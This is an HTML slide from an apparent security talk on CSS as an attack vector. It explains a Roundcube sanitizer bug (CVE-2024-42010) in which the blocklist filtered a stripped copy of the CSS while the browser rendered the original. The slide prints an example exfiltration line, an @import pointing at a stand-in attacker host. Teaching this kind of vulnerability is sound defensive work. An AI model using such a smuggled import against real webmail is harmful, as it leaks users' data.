@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>22 / 37 - CSS as an Attack Vector</title>
+<style>
+  html,body{ margin:0; padding:0; background:#000; }
+  section{ position:relative; width:1920px; height:1080px; overflow:hidden; box-sizing:border-box; }
+  section aside{ display:none; }
+  body{ position:relative; width:1920px; height:1080px; }
+  .nav a{ position:absolute; bottom:20px; display:inline-block; padding:10px 18px;
+           background:#0c0f14; color:#e8ecf1; border:1px solid #2a313c; border-radius:10px;
+           font-family:monospace; font-size:20px; text-decoration:none; }
+  .nav a:hover{ border-color:#6fd3c6; }
+  .nav .prev{ left:24px; }
+  .nav .next{ right:24px; }
+  .nav .count{ left:912px; width:96px; text-align:center; color:#8b97a3; }
+</style>
+</head><body>
+<section id="no2" data-transition="fade" style="background:#14181F;color:#E8ECF1;font-family:'IBM Plex Sans', Arial, sans-serif;padding:104px 128px;display:grid;grid-template-columns:1fr 1fr;gap:72px;align-items:center">
+<div style="display:flex;flex-direction:column;gap:26px">
+<div style="display:flex;align-items:baseline;gap:28px">
+<h2 style="font-size:132px;font-weight:700;line-height:0.9;color:#FF5C49">No.</h2>
+</div>
+<p style="font-size:40px;font-weight:600;line-height:1.2;color:#E8ECF1">You filtered one copy. The browser ran a different one.</p>
+<p style="font-size:32px;line-height:1.4;color:#C2CCD6">Roundcube checked a <b style="color:#E8ECF1;font-weight:600">stripped</b> version of the CSS against a blocklist &mdash; then rendered the <b style="color:#E8ECF1;font-weight:600">original.</b> A smuggled import walked straight through.</p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:24px;color:#8B97A3">CVE-2024-42010 &middot; CVSS 7.5 &middot; fixed in 1.6.8</p>
+</div>
+<div style="background:#0C0F14;border:1px solid #2A313C;border-radius:16px;padding:44px;display:flex;flex-direction:column;gap:24px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:22px;color:#6B7684">the whole bug, one line</p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:30px;line-height:1.5;color:#FF8A7A">@import &quot;//a.evil.com/leak&quot;</p>
+<hr style="border-top:1px solid #2A313C;width:100%">
+<p style="font-size:28px;line-height:1.45;color:#C2CCD6">Blocklists lose to <b style="color:#E8ECF1;font-weight:600">parser differentials:</b> any gap between what the filter sees and what the engine runs.</p>
+</div>
+<aside>The "parser differential" idea &mdash; the single most important recurring theme in every webmail CSS bug, so name it clearly. Roundcube's sanitizer ran its regex blocklist over a stripped/normalised copy of the CSS, but the renderer used the original, so an @import that the filter didn't see in its stripped form still executed and pulled in an attacker stylesheet that leaks data. It hit government webmail installs. The takeaway that carries the rest of the talk: a blocklist is only as good as the parser agreeing with the browser, and they never fully do. ~55 seconds. Then: "blocklists are naive, I'll use the CSSOM."</aside>
+</section>
+<div class="nav">
+<a class="prev" href="slide-21.html">&lsaquo; Prev</a>
+<a class="count" href="index.html">22 / 37</a>
+<a class="next" href="slide-23.html">Next &rsaquo;</a>
+</div>
+</body></html>
